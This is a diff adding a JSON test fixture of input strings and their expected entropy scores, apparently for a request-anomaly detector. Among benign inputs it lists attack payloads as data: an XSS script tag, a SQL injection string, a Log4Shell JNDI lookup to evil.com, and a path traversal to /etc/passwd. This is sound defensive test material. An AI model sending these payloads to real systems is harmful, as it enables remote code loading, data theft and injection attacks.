@@ -1,0 +1,34 @@
+[
+  {
+    "input": "",
+    "expected_entropy": 0.0
+  },
+  {
+    "input": "hello",
+    "expected_entropy": 1.921928
+  },
+  {
+    "input": "/api/books/101",
+    "expected_entropy": 3.182006
+  },
+  {
+    "input": "<script>alert(1)</script>",
+    "expected_entropy": 3.783465
+  },
+  {
+    "input": "' OR '1'='1' --",
+    "expected_entropy": 2.549255
+  },
+  {
+    "input": "${jndi:ldap://evil.com/a}",
+    "expected_entropy": 4.053661
+  },
+  {
+    "input": "../../etc/passwd",
+    "expected_entropy": 3.07782
+  },
+  {
+    "input": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "expected_entropy": 4.81882
+  }
+]
